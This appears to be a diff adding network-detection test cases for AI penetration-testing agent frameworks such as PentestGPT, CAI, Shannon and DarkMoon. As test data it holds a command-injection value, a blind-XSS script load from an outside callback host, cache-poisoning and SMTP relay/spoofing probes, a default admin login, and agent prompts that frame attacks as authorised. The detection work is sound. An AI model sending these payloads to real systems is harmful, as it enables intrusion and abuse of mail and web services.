@@ -449,6 +449,548 @@ def define_cases(work):
     lookup("payload name with a polling. label in front, burpcollaborator", [3801058], "polling.x7k2m9p4q1.burpcollaborator.net")
     http("near miss: wsus service from inside", [], post("/ApiRemoting30/WebService.asmx", "<soap/>", ctype="text/xml"), client="int", port=8530)
 
+    # ---- integrate:hacksynth
+    # ---- HackSynth: attackbox setup download from the source (docker_setup.py:36); no console and no target-side marker
+    http("hacksynth attackbox kali-linux-headless download", [3812401],
+         get("/kali/pool/main/k/kali-meta/kali-linux-headless_2025.4.0_amd64.deb", ua="Debian APT-HTTP/1.3 (2.9.8)", host="http.kali.org"),
+         ok("deb", ctype="application/vnd.debian.binary-package"), client="int", server="ext")
+    http("near miss: another kali metapackage download", [],
+         get("/kali/pool/main/k/kali-meta/kali-linux-default_2025.4.0_amd64.deb", ua="Debian APT-HTTP/1.3 (2.9.8)", host="http.kali.org"),
+         ok("deb", ctype="application/vnd.debian.binary-package"), client="int", server="ext")
+    http("near miss: kali-linux-headless download from outside home net", [],
+         get("/kali/pool/main/k/kali-meta/kali-linux-headless_2025.4.0_amd64.deb", ua="Debian APT-HTTP/1.3 (2.9.8)", host="http.kali.org"))
+
+    # ---- integrate:autopt
+    # ---- AutoPT: page reader user agents from the source (evenhu9/AutoPT at e38e2086, Dizzy-K/AutoPT at fb26e0c4) and the console
+    truncated_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    http("autopt page reader on a target", [3812601],
+         get("/user/register", ua=truncated_ua, headers="Accept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n"))
+    http("near miss: a full Chrome user agent on a target", [], get("/user/register"))
+    http("autopt upstream page reader", [3812602], get("/CHANGELOG.txt", ua="AutoPT/1.0"))
+    http("near miss: a user agent that only contains autopt", [], get("/", ua="Mozilla/5.0 (compatible; MyAutoPT/2.0)"))
+    autopt_page = ('<!DOCTYPE html><html lang="zh-CN"><head><title>AutoPT - 自动化渗透测试平台</title></head><body>'
+                   '<div class="logo-text"><h1>AutoPT</h1><span>AI Penetration Testing</span></div></body></html>')
+    http("autopt console page", [3812603], get("/"), client="int", port=5000, response=ok(autopt_page))
+    http("near miss: another page titled AutoPT", [], get("/"), client="int", port=5000,
+         response=ok("<html><head><title>AutoPT - docs</title></head><body>Automatic patching</body></html>"))
+    autopt_config = ('{"data":{"ai":{"nvidia_key":"","openai_base":"https://api.example.test/v1","openai_key":"sk-test",'
+                     '"temperature":0.5},"local":{"command_timeout":120,"target_host":"192.0.2.10","xray_path":"./xray/"},'
+                     '"psm":{"debug":true,"draw_graph":false,"exp_iterations":12}},"status":"ok"}')
+    http("autopt console configuration with keys", [3812604], get("/api/config"), client="int", port=5000,
+         response=ok(autopt_config, ctype="application/json"))
+    http("near miss: another app's config with an openai_key", [], get("/api/config"), client="int", port=5000,
+         response=ok('{"openai_key":"sk-test","model":"gpt-4o"}', ctype="application/json"))
+    autopt_info = ('{"data":{"arch":"x86_64","docker_available":true,"docker_version":"Docker version 27.0.3",'
+                   '"platform":"Linux","python_version":"3.11.9","xray_available":false,"xray_info":"xray路径: /opt/AutoPT/xray/xray_linux_amd64"},"status":"ok"}')
+    http("autopt console system info", [3812605], get("/api/system/info"), client="int", port=5000,
+         response=ok(autopt_info, ctype="application/json"))
+    http("near miss: system info without xray", [], get("/api/system/info"), client="int", port=5000,
+         response=ok('{"docker_available":true,"platform":"Linux"}', ctype="application/json"))
+    http("autopt console agent run started", [3812606],
+         post("/api/task/start", '{"name":"drupal/CVE-2018-7600","ip_addr":"192.0.2.10","model":"gpt4omini"}'), client="int", port=5000)
+    http("near miss: autopt console task status poll", [], get("/api/task/status"), client="int", port=5000)
+
+    # ---- integrate:pentestgpt
+    # ---- PentestGPT: its prompts and the v1.0.0 telemetry key in decrypted model traffic, and the UnifiedAgent Inspector
+    claude_ua = "claude-cli/2.1.98 (external, sdk-py)"
+    sup = ('{"model":"claude-opus-4-8","system":[{"type":"text","text":"You are Claude Code."},{"type":"text","text":'
+           '"You are the Supervisor for an authorized penetration test. You may use every tool exposed by the provider"}],'
+           '"messages":[{"role":"user","content":"Choose the next penetration-testing task from this authoritative state. '
+           'When validation_feedback is present, correct that contract violation in this decision."}]}')
+    http("pentestgpt supervisor request (decrypted)", [3814001, 3814003], post("/v1/messages", sup, ua=claude_ua, host="api.anthropic.com"),
+         client="int", server="ext")
+    exe = ('{"model":"claude-opus-4-8","system":[{"type":"text","text":"You are the Executor for an authorized penetration test. '
+           'Perform only the one supplied task."}],"messages":[{"role":"user","content":"Execute exactly this task envelope and '
+           'return its grounded result.\\n\\n{\\"kind\\": \\"discover\\"}"}]}')
+    http("pentestgpt executor request (decrypted)", [3814002, 3814004], post("/v1/messages", exe, ua=claude_ua, host="api.anthropic.com"),
+         client="int", server="ext")
+    v1 = ('{"model":"claude-sonnet-4-5-20250929","system":"You are PentestGPT, an AI-powered CTF challenge solver and penetration '
+          'testing assistant.","messages":[]}')
+    http("pentestgpt v1.0.0 system prompt (decrypted)", [3814005], post("/v1/messages", v1, ua=claude_ua, host="api.anthropic.com"),
+         client="int", server="ext")
+    ptt = ('{"model":"gpt-5.5","messages":[{"role":"user","content":"You\'re an excellent cybersecurity penetration tester assistant. '
+           'You are required to record the penetration testing process in a tree structure: \\"Penetration Testing Tree (PTT)\\"."}]}')
+    http("pentestgpt legacy ptt prompt (decrypted)", [3814006], post("/v1/chat/completions", ptt, ua="OpenAI/Python 1.55.0", host="api.openai.com"),
+         client="int", server="ext")
+    http("pentestgpt v1.0.0 langfuse telemetry (decrypted)", [3814010],
+         post("/api/public/otel/v1/traces", "\x0a\x00", ua="python-requests/2.32.3", host="us.cloud.langfuse.com", ctype="application/x-protobuf",
+              headers="x_langfuse_sdk_name: python\r\nx_langfuse_public_key: pk-lf-49d66e88-3a92-478e-92a6-09bae920d69a\r\n"),
+         client="int", server="ext")
+    runs = ('{"runs":[{"run_id":"trial-0123456789ab--supervisor-r0","backend":"claude","workspace":"/w/agent-workspaces/trial-0123456789ab/supervisor",'
+            '"status":"running","prompt":null,"metadata":{"attempt_id":null,"episode_id":"supervisor-r0","pentest_run_id":"trial-0123456789ab",'
+            '"project":"PentestGPT","role":"supervisor","state_revision":0,"task_id":null},"owner_host":"lab","owner_pid":4242,'
+            '"started_at":1.0,"last_event_at":2.0,"completed_at":null,"error":null,"last_sequence":3,"owner_alive":true,"stale":false}]}')
+    http("pentestgpt runs in unifiedagent inspector", [3814020], get("/api/runs"), client="int", port=8765, response=ok(runs, ctype="application/json"))
+    http("unifiedagent inspector page", [3814021], get("/"), client="int", port=8765,
+         response=ok('<!doctype html><html lang="en"><head><meta charset="utf-8"><title>UnifiedAgent Inspector</title></head></html>'))
+    http("near miss: another agent's supervisor prompt", [], post("/v1/messages", sup.replace("You are the Supervisor for an", "You are a supervisor for an").replace("penetration-testing task", "pentest task"),
+         ua=claude_ua, host="api.anthropic.com"), client="int", server="ext")
+    http("near miss: prompt text in a response, not a request", [], get("/blog/pentestgpt"), client="int", server="ext",
+         response=ok("<p>You are PentestGPT, an AI-powered CTF challenge solver</p>"))
+    http("near miss: the paper's tree named without the prompt", [], post("/v1/chat/completions", '{"messages":[{"role":"user","content":"Summarise the Penetration Testing Tree (PTT) idea"}]}',
+         host="api.openai.com"), client="int", server="ext")
+    http("near miss: another langfuse project", [], post("/api/public/otel/v1/traces", "\x0a\x00", host="us.cloud.langfuse.com", ctype="application/x-protobuf",
+         headers="x_langfuse_public_key: pk-lf-00000000-1111-2222-3333-444444444444\r\n"), client="int", server="ext")
+    http("near miss: inspector runs of another project", [], get("/api/runs"), client="int", port=8765,
+         response=ok(runs.replace('"project":"PentestGPT"', '"project":"demo"'), ctype="application/json"))
+    http("near miss: another inspector page", [], get("/"), client="int", port=8765, response=ok("<html><head><title>Agent Inspector</title></head></html>"))
+
+    # ---- integrate:cai
+    # ---- CAI (aliasrobotics/cai at 6dc79257): telemetry, Alias gateway, fetch_url user agent and the cai --api backend
+    lookup("cai telemetry lookup", [3816001], "logs.aliasrobotics.com")
+    tls_sni("cai telemetry sni", [3816002], "logs.aliasrobotics.com")
+    lookup("near miss: another name ending in logs.aliasrobotics.com", [], "applogs.aliasrobotics.com")
+    tls_sni("near miss: the alias robotics web site", [], "aliasrobotics.com")
+    cai_log = ('--b0undary\r\nContent-Disposition: form-data; name="session_id"\r\n\r\n3f1c2a9e-1111-4222-8333-944455556666\r\n'
+               '--b0undary\r\nContent-Disposition: form-data; name="log"; filename="cai_3f1c2a9e-1111-4222-8333-944455556666_20261126_101500_kali_linux_6.8.0_203_0_113_7.jsonl"\r\n'
+               'Content-Type: application/octet-stream\r\n\r\n{"event": "session_start", "session_id": "3f1c2a9e-1111-4222-8333-944455556666", "alias_api_key": ""}\r\n--b0undary--\r\n')
+    http("cai telemetry upload (decrypted)", [3816003, 3816004],
+         post("/upload/intermediate", cai_log, host="logs.aliasrobotics.com", ctype="multipart/form-data; boundary=b0undary"),
+         client="int", server="ext")
+    http("cai session log uploaded somewhere else (decrypted)", [3816004],
+         post("/upload", cai_log, host="logs.example.test", ctype="multipart/form-data; boundary=b0undary"), client="int", server="ext")
+    http("near miss: another log upload", [],
+         post("/upload", '--b0undary\r\nContent-Disposition: form-data; name="log"; filename="app.log"\r\n\r\nx\r\n--b0undary--\r\n',
+              host="logs.example.test", ctype="multipart/form-data; boundary=b0undary"), client="int", server="ext")
+    lookup("cai alias gateway lookup", [3816010], "api.aliasrobotics.com")
+    tls_sni("cai alias gateway sni", [3816011], "api.aliasrobotics.com")
+    lookup("cai private package index lookup", [3816012], "packages.aliasrobotics.com")
+    tls_sni("cai private package index sni", [3816013], "packages.aliasrobotics.com")
+    lookup("near miss: a look-alike gateway name", [], "api.aliasrobotics.com.example.test")
+    tls_sni("near miss: a look-alike package index name", [], "mypackages.aliasrobotics.com")
+    http("cai licence check (decrypted)", [3816014],
+         get("/key/info", ua="python-httpx/0.28.1", host="api.aliasrobotics.com:666", headers="Authorization: Bearer sk-0000000000000000\r\n"),
+         client="int", server="ext", port=666)
+    http("near miss: licence path without a key", [], get("/key/info", ua="python-httpx/0.28.1", host="api.aliasrobotics.com:666"),
+         client="int", server="ext", port=666)
+    http("cai fetch_url user agent", [3816020],
+         get("/pricing", ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"))
+    http("cai api tag discovery", [3816030], get("/api/tags", ua="curl/8.5.0"), client="int", port=8000,
+         response=ok('{"tags":["meta","auth","catalog","sessions","inference","commands","ux"]}', ctype="application/json"))
+    http("near miss: another api's tag list", [], get("/api/tags", ua="curl/8.5.0"), client="int", port=8000,
+         response=ok('{"tags":["meta","auth","catalog"]}', ctype="application/json"))
+    http("cai api openapi document", [3816031], get("/api/openapi.json", ua="curl/8.5.0"), client="int", port=8000,
+         response=ok('{"openapi":"3.1.0","info":{"title":"CAI API","description":"Backend HTTP state for the Cybersecurity AI Framework","version":"1.1.5"}}', ctype="application/json"))
+    http("near miss: another openapi document", [], get("/api/openapi.json", ua="curl/8.5.0"), client="int", port=8000,
+         response=ok('{"openapi":"3.1.0","info":{"title":"CAI API","version":"1.0"}}', ctype="application/json"))
+    http("cai api key header", [3816032], get("/api/v1/agents", ua="python-requests/2.32.3", headers="X-CAI-API-Key: sk-0000000000000000\r\n"),
+         client="int", port=8000)
+    http("near miss: a generic api key header", [], get("/api/v1/agents", ua="python-requests/2.32.3", headers="X-API-Key: sk-0000000000000000\r\n"),
+         client="int", port=8000)
+    http("cai api device pairing", [3816033], post("/api/v1/auth/add-ip", '{"ip":"203.0.113.7"}'), client="int", port=8000)
+    http("near miss: cai api login", [], post("/api/v1/auth/login", '{"username":"u","password":"p"}'), client="int", port=8000)
+
+    # ---- integrate:shannon
+    # ---- Shannon: the php2shell probe body and boundary, the stealth browser user agent and the Temporal workflow list,
+    # all from the source (KeygraphHQ/shannon at 3760d2f9)
+    shannon_b = "----shannonPhp2shellProbe0123456789abcdef0123456789abcdef"
+    shannon_flood = f"--{shannon_b}\r\n" + "".join(f"X-h{i}: a\r\n" for i in range(40)) + f"\r\nprobe\r\n--{shannon_b}--\r\n"
+    http("shannon php2shell probe, boundary and header flood", [3813001, 3813002],
+         post("/login", shannon_flood, ua="node", ctype=f"multipart/form-data; boundary={shannon_b}"), ok("", "500 Internal Server Error"))
+    http("shannon php2shell control request, boundary only", [3813001],
+         post("/login", f'--{shannon_b}\r\nContent-Disposition: form-data; name="probe"\r\n\r\ncontrol\r\n--{shannon_b}--\r\n',
+              ua="node", ctype=f"multipart/form-data; boundary={shannon_b}"))
+    http("shannon php2shell header flood under another boundary", [3813002],
+         post("/login", shannon_flood.replace(shannon_b, "----formboundary42"), ua="node", ctype="multipart/form-data; boundary=----formboundary42"),
+         ok("", "500 Internal Server Error"))
+    http("near miss: ordinary multipart upload", [],
+         post("/upload", '------WebKitFormBoundary7MA4YWxk\r\nContent-Disposition: form-data; name="file"; filename="a.txt"\r\nX-Note: a\r\n\r\nhi\r\n------WebKitFormBoundary7MA4YWxk--\r\n',
+              ua=BROWSER, ctype="multipart/form-data; boundary=---WebKitFormBoundary7MA4YWxk"))
+    http("near miss: chrome 125 on linux (strix replay agent)", [],
+         get("/", ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"))
+    shannon_wf = ('{"executions":[{"execution":{"workflowId":"app-example-test_shannon-1764123456789","runId":"0b1c"},'
+                  '"type":{"name":"pentestPipelineWorkflow"},"status":"WORKFLOW_EXECUTION_STATUS_RUNNING","taskQueue":"shannon-1a2b3c4d"}]}')
+    http("shannon workflows in the temporal api", [3813010], get("/api/v1/namespaces/default/workflows"), client="int", port=8233,
+         response=ok(shannon_wf, ctype="application/json"))
+    http("near miss: temporal api without shannon workflows", [], get("/api/v1/namespaces/default/workflows"), client="int", port=8233,
+         response=ok(shannon_wf.replace("pentestPipelineWorkflow", "orderFulfillmentWorkflow").replace("_shannon-", "_orders-"), ctype="application/json"))
+
+    # ---- integrate:vulnbot
+    # ---- VulnBot: prompts in model requests (KHenryAegis/VulnBot at 9a12effa) and its knowledge base API
+    http("vulnbot role prompt in a model request", [3812501],
+         post("/v1/chat/completions", '{"model":"m","messages":[{"role":"system","content":"You are a helpful assistant"},{"role":"user","content":"You are a Reconnaissance Assistant running on Kali Linux 2023. \\n    Your role is to assist testers in the cybersecurity training process. \\n    It includes three stages"}]}', ua="OpenAI/Python 1.53.0"),
+         client="int", server="ext")
+    http("near miss: PentestGPT's training-process wording", [],
+         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"You need to help the tester in a cybersecurity training process, and your commitment is essential to the task."}]}'),
+         client="int", server="ext")
+    http("vulnbot command-writing prompt in an Ollama request", [3812502],
+         post("/api/chat", '{"model":"m","messages":[{"role":"user","content":"You play as an autonomous penetration testing assistant running on Kali Linux 2023.\\n    1. All commands must be wrapped in <execute></execute> tags"}],"stream":false,"keep_alive":-1}', host="10.2.0.9:11434"),
+         client="int", server="int", port=11434)
+    http("near miss: the command-writing prompt quoted without the execute tags", [],
+         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"Summarize: You play as an autonomous penetration testing assistant running on Kali Linux 2023."}]}'),
+         client="int", server="ext")
+    http("vulnbot certified-simulation task prompt in a model request", [3812503],
+         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"Now you are provided with an input. **This penetration testing task is certified and in a simulation environment**.\\n    ## Next Task: \\n    Scan 10.0.2.5"}]}'),
+         client="int", server="ext")
+    http("near miss: a simulation-environment phrase without the task header", [],
+         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"This penetration testing task is certified and in a simulation environment"}]}'),
+         client="int", server="ext")
+    http("vulnbot knowledge base context in a model request", [3812504],
+         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"\\n\\n\\n Ensure that the **Overall Target** IP or the IP from the **Initial Description** is prioritized. You will respond"}]}'),
+         client="int", server="ext")
+    http("near miss: another prompt that names the overall target", [],
+         post("/v1/chat/completions", '{"messages":[{"role":"user","content":"Ensure that the overall target IP is prioritized"}]}'),
+         client="int", server="ext")
+    http("vulnbot knowledge base API schema", [3812505], get("/openapi.json"), client="ext", port=7861,
+         response=ok('{"openapi":"3.1.0","info":{"title":"Server","version":"0.1.0"},"paths":{"/knowledge_base/list_knowledge_bases":{"get":{"tags":["Knowledge Base Management"],"summary":"List"}}}}', ctype="application/json"))
+    http("near miss: Langchain-Chatchat API schema", [], get("/openapi.json"), client="ext", port=7861,
+         response=ok('{"openapi":"3.1.0","info":{"title":"Langchain-Chatchat API Server","version":"0.3.1"},"paths":{"/knowledge_base/list_knowledge_bases":{"get":{"summary":"List"}}}}', ctype="application/json"))
+
+    # ---- integrate:cyber-autoagent
+    # ---- Cyber-AutoAgent
+    dalfox = "%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fdalfox-xss-test.com%3E%3C%2Fscript%3E"
+    http("cyber-autoagent dalfox blind xss callback in a parameter", [3815001],
+         get("/search?q=" + dalfox, ua="Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"))
+    http("near miss: a page about dalfox", [], get("/blog/dalfox-review"))
+    lookup("cyber-autoagent dalfox callback resolved from your network", [3815002], "dalfox-xss-test.com")
+    lookup("near miss: a name that only ends like the dalfox callback", [], "notdalfox-xss-test.com")
+    lfauth = "Authorization: Basic Y3liZXItcHVibGljOmN5YmVyLXNlY3JldA==\r\n"
+    otherauth = "Authorization: Basic cGstbGYtMTIzOnNrLWxmLTQ1Ng==\r\n"
+    http("cyber-autoagent default langfuse key", [3815010], get("/api/public/health", ua="python-requests/2.32.3", host="lf.example.test:3000", headers=lfauth),
+         client="int", server="ext", port=3000)
+    http("near miss: langfuse with its own keys", [], get("/api/public/health", ua="python-requests/2.32.3", host="lf.example.test:3000", headers=otherauth),
+         client="int", server="ext", port=3000)
+    http("cyber-autoagent prompt fetch from langfuse", [3815011],
+         get("/api/public/v2/prompts/cyber/system/system_prompt?label=production", ua="Python-urllib/3.12", host="lf.example.test:3000", headers=otherauth),
+         client="int", server="ext", port=3000)
+    http("near miss: another app's langfuse prompt", [],
+         get("/api/public/v2/prompts/support-bot/system?label=production", ua="Python-urllib/3.12", host="lf.example.test:3000", headers=otherauth),
+         client="int", server="ext", port=3000)
+    http("cyber-autoagent trace export to langfuse", [3815012],
+         post("/api/public/otel/v1/traces", "\n\x1a\n\x18\n\x0cservice.name\x12\x08\n\x0fcyber-autoagent", ua="OTel-OTLP-Exporter-Python/1.37.0",
+              host="lf.example.test:3000", headers=otherauth, ctype="application/x-protobuf"), client="int", server="ext", port=3000)
+    http("near miss: another service's trace export", [],
+         post("/api/public/otel/v1/traces", "\n\x1a\n\x18\n\x0cservice.name\x12\x08\n\x06web-api", ua="OTel-OTLP-Exporter-Python/1.37.0",
+              host="lf.example.test:3000", headers=otherauth, ctype="application/x-protobuf"), client="int", server="ext", port=3000)
+    http("cyber-autoagent langfuse default admin login", [3815013],
+         post("/api/auth/callback/credentials", "email=admin%40cyber-autoagent.com&password=changeme&csrfToken=0f1e2d&json=true",
+              ua=BROWSER, host="10.2.0.5:3000", ctype="application/x-www-form-urlencoded"), port=3000)
+    http("near miss: langfuse login with another account", [],
+         post("/api/auth/callback/credentials", "email=ops%40example.test&password=x&csrfToken=0f1e2d&json=true",
+              ua=BROWSER, host="10.2.0.5:3000", ctype="application/x-www-form-urlencoded"), port=3000)
+    http("cyber-autoagent langfuse project page", [3815014], get("/project/cyber-project-id/traces", host="10.2.0.5:3000"), port=3000)
+    http("near miss: another langfuse project page", [], get("/project/clx0abc123def/traces", host="10.2.0.5:3000"), port=3000)
+    http("cyber-autoagent langfuse answer naming the seeded project", [3815015], get("/api/public/projects", host="10.2.0.5:3000", headers=otherauth), port=3000,
+         response=ok('{"data":[{"id":"cyber-project-id","name":"penetration-tests","metadata":{}}]}', ctype="application/json"))
+    http("near miss: langfuse answer for another project", [], get("/api/public/projects", host="10.2.0.5:3000", headers=otherauth), port=3000,
+         response=ok('{"data":[{"id":"clx0abc123def","name":"support-bot","metadata":{}}]}', ctype="application/json"))
+
+    # ---- integrate:pentestagent
+    # ---- PentestAgent (nbshenxm/pentest-agent, arXiv 2411.05185 paper code): default proof command touch /tmp/success
+    http("pentestagent paper proof command in a URL parameter", [3812701], get("/cgi-bin/ping.cgi?host=127.0.0.1%3btouch%20/tmp/success"))
+    http("pentestagent paper proof command in a form body", [3812702],
+         post("/api/exec", "cmd=touch+/tmp/success", ctype="application/x-www-form-urlencoded"))
+    http("pentestagent paper proof command in a header", [3812703],
+         get("/index.action", headers="X-Cmd: %{(#cmd='touch /tmp/success')}\r\n"))
+    http("near miss: a path that only names /tmp/success", [], get("/static/tmp/success.png"))
+    http("near miss: another command on /tmp/success in a body", [], post("/api/exec", "cmd=cat+/tmp/success", ctype="application/x-www-form-urlencoded"))
+    http("near miss: /tmp/success in a Referer", [], get("/", headers="Referer: http://lab.example.test/tmp/success\r\n"))
+
+    # ---- PentestAgent (GH05TCREW/pentestagent): browser user agent and the unauthenticated MCP server (8080)
+    pa_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    http("ghostcrew pentestagent browser user agent: the shared truncated Chrome rule", [3812601], get("/login", ua=pa_ua))
+    http("near miss: a full Chrome user agent", [], get("/login", ua=BROWSER))
+    pa_init = ('{"jsonrpc": "2.0", "id": 1, "result": {"protocolVersion": "2024-11-05", '
+               '"serverInfo": {"name": "pentest-mcp", "version": "1.0.0"}, "capabilities": {"tools": {}}}}')
+    http("ghostcrew pentestagent mcp initialize answer", [3812802],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}', ua="python-httpx/0.28.1"), client="int", port=8080,
+         response=ok(pa_init, headers="Mcp-Session-Id: 3f2b8c1e-5d4a-4c7b-9e1f-2a6d8b0c4e5f\r\n", ctype="application/json"))
+    http("near miss: another mcp server initialize answer", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}', ua="python-httpx/0.28.1"), client="int", port=8080,
+         response=ok(pa_init.replace("pentest-mcp", "notes-mcp"), ctype="application/json"))
+    http("ghostcrew pentestagent mcp run_task call", [3812803],
+         post("/mcp", '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_task","arguments":{"task":"scan 10.0.0.1"}}}',
+              ua="python-httpx/0.28.1", headers="Mcp-Session-Id: 3f2b8c1e-5d4a-4c7b-9e1f-2a6d8b0c4e5f\r\n"), client="int", port=8080,
+         response=ok('{"jsonrpc": "2.0", "id": 2, "result": {"content": []}}', ctype="application/json"))
+    http("near miss: mcp tools/call of another tool", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"list_tasks","arguments":{}}}',
+              ua="python-httpx/0.28.1", headers="Mcp-Session-Id: 3f2b8c1e-5d4a-4c7b-9e1f-2a6d8b0c4e5f\r\n"), client="int", port=8080,
+         response=ok('{"jsonrpc": "2.0", "id": 3, "result": {"content": []}}', ctype="application/json"))
+    http("ghostcrew pentestagent mcp session error", [3812804], get("/mcp", ua="curl/8.5.0"), client="int", port=8080,
+         response=ok("Mcp-Session-Id header required", "400 Bad Request", headers="Server: Python/3.12 aiohttp/3.13.2\r\n",
+                     ctype="text/plain; charset=utf-8"))
+    http("near miss: the same session error from another server", [], get("/mcp", ua="curl/8.5.0"), client="int", port=8080,
+         response=ok("Mcp-Session-Id header required", "400 Bad Request", headers="Server: uvicorn\r\n", ctype="text/plain"))
+
+    # ---- integrate:darkmoon
+    # ---- DarkMoon: probes written out in the agent prompts (ASCIT31/Dark-Moon at bb1b70ce, conf/agents/) and the MCP server
+    http("darkmoon edge agent user agent (curl -sSI -A dm-edge)", [3812901],
+         b"HEAD / HTTP/1.1\r\nHost: app.example.test\r\nUser-Agent: dm-edge\r\nAccept: */*\r\n\r\n", ok(""))
+    http("near miss: a monitoring user agent that starts with dm-edge", [], get("/", ua="dm-edge-monitor/1.0"))
+    http("darkmoon cache poisoning probe", [3812902, 3812903], get("/?dmcb=DM1", headers="X-Forwarded-Host: dm-poison.invalid\r\n"))
+    http("darkmoon cache buster follow-up request", [3812903], get("/?dmcb=DM1"))
+    http("near miss: another cache buster and forwarded host", [], get("/?dmcb=DM2", headers="X-Forwarded-Host: cdn.example.test\r\n"))
+    case("darkmoon smtp relay test", [3812904, 3812906], port=25,
+         request=b"EHLO dm-test.local\r\nMAIL FROM:<test@dm-test.local>\r\nRCPT TO:<ops@example.test>\r\nDATA\r\n"
+                 b"Subject: DM RELAY TEST\r\n\r\nAuthorised security test.\r\n.\r\nQUIT\r\n",
+         response=b"220 mail.example.test ESMTP\r\n250 mail.example.test\r\n")
+    case("darkmoon smtp user enumeration", [3812904, 3812905], port=25,
+         request=b"EHLO dm-test.local\r\nVRFY root\r\nVRFY dm-nosuchuser-9182\r\nQUIT\r\n",
+         response=b"220 mail.example.test ESMTP\r\n250 mail.example.test\r\n")
+    case("darkmoon smtp spoofing test from another greeting", [3812906], port=25,
+         request=b"EHLO mail.example.test\r\nMAIL FROM:<noreply@example.test>\r\nRCPT TO:<ops@example.test>\r\nDATA\r\n"
+                 b"From: IT Support <it-support@example.test>\r\nSubject: DM SPOOF TEST\r\n\r\nAuthorised security test.\r\n.\r\nQUIT\r\n",
+         response=b"220 mail.example.test ESMTP\r\n250 mail.example.test\r\n")
+    case("near miss: a mail client greeting from a longer name and an ordinary subject", [], port=25,
+         request=b"EHLO dm-test.localdomain\r\nVRFY dm-nosuchuser-91820\r\nMAIL FROM:<a@example.test>\r\nRCPT TO:<b@example.test>\r\nDATA\r\n"
+                 b"Subject: DM RELAY TESTING notes\r\n\r\nhello\r\n.\r\nQUIT\r\n",
+         response=b"220 mail.example.test ESMTP\r\n250 mail.example.test\r\n")
+    http("darkmoon registry push proof manifest", [3812907], get("/v2/shop/web/manifests/darkmoon-proof-7f3a9c", ua="curl/8.11.1"))
+    http("near miss: an ordinary manifest fetch", [], get("/v2/shop/web/manifests/latest", ua="curl/8.11.1"))
+    http("darkmoon scim write proof", [3812908],
+         post("/scim/v2/Users", '{"schemas":["urn:ietf:params:scim:schemas:core:2.0:User"],"userName":"darkmoon-test","active":true}', ua="curl/8.11.1",
+              ctype="application/scim+json"))
+    http("near miss: an ordinary scim user", [], post("/scim/v2/Users", '{"userName":"jane.doe","active":true}', ua="curl/8.11.1", ctype="application/scim+json"))
+    http("darkmoon placeholder model key to an on-prem endpoint", [3812910],
+         post("/v1/messages", '{"model":"claude-opus-4-6","max_tokens":1024,"messages":[{"role":"user","content":"hi"}]}', ua="node",
+              headers="x-api-key: darkmoon-local\r\nanthropic-version: 2023-06-01\r\n"), client="int", server="int", port=8000)
+    http("near miss: a real-looking model key to the same endpoint", [],
+         post("/v1/messages", '{"model":"claude-opus-4-6","max_tokens":1024,"messages":[]}', ua="node",
+              headers="x-api-key: sk-ant-api03-example\r\nanthropic-version: 2023-06-01\r\n"), client="int", server="int", port=8000)
+    http("darkmoon mcp initialize answer", [3812911],
+         post("/mcp", '{"jsonrpc":"2.0","id":0,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"opencode","version":"1.19.6"}}}',
+              ua="node", headers="Accept: application/json, text/event-stream\r\n"), client="int", server="int", port=8181,
+         response=ok('event: message\r\ndata: {"jsonrpc":"2.0","id":0,"result":{"protocolVersion":"2025-06-18","capabilities":{"tools":{"listChanged":true}},'
+                     '"serverInfo":{"name":"Darkmoon CyberSecurity","version":"2.12.0"}}}\r\n\r\n', ctype="text/event-stream"))
+    http("darkmoon mcp tool list", [3812912],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"tools/list"}', ua="node"), client="int", server="int", port=8181,
+         response=ok('{"jsonrpc":"2.0","id":1,"result":{"tools":[{"name":"execute_command"},{"name":"dashboard_init_campaign"},{"name":"dashboard_push_finding"}]}}',
+                     ctype="application/json"))
+    http("darkmoon mcp tool call pushing a finding", [3812913],
+         post("/mcp", '{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"dashboard_push_finding","arguments":{"campaign_id":"camp_20261126_ab12cd34"}}}',
+              ua="node"), client="int", server="int", port=8181, response=ok('{"jsonrpc":"2.0","id":7,"result":{}}', ctype="application/json"))
+    http("near miss: another MCP server's initialize answer and tool list", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":0,"method":"initialize"}', ua="node"), client="int", server="int", port=8181,
+         response=ok('{"jsonrpc":"2.0","id":0,"result":{"serverInfo":{"name":"Example Tools","version":"1.0"},"tools":[{"name":"push_finding"}]}}',
+                     ctype="application/json"))
+
+    # ---- integrate:decepticon
+    # ---- Decepticon: from the Decepticon source (BitterSecurity/Decepticon at 6b15092d; web console at d26ddaa1)
+    lookup("decepticon telemetry lookup", [3811301], "decepticon-telemetry-gateway.purpleailab.workers.dev")
+    lookup("near miss: another workers.dev telemetry gateway", [], "decepticon-telemetry-gateway.example.workers.dev")
+    tls_sni("decepticon telemetry sni", [3811302], "decepticon-telemetry-gateway.purpleailab.workers.dev")
+    tls_sni("near miss: another worker on the same account", [], "telemetry-gateway.purpleailab.workers.dev")
+    http("decepticon telemetry batch (decrypted)", [3811303],
+         post("/v1/telemetry", '{"schema_version":"1.0","tier":"A","events":[]}', ua="decepticon-telemetry/1.0",
+              host="decepticon-telemetry-gateway.purpleailab.workers.dev"), client="int", server="ext")
+    http("near miss: another product's telemetry client", [], post("/v1/telemetry", "{}", ua="acme-telemetry/1.0"),
+         client="int", server="ext")
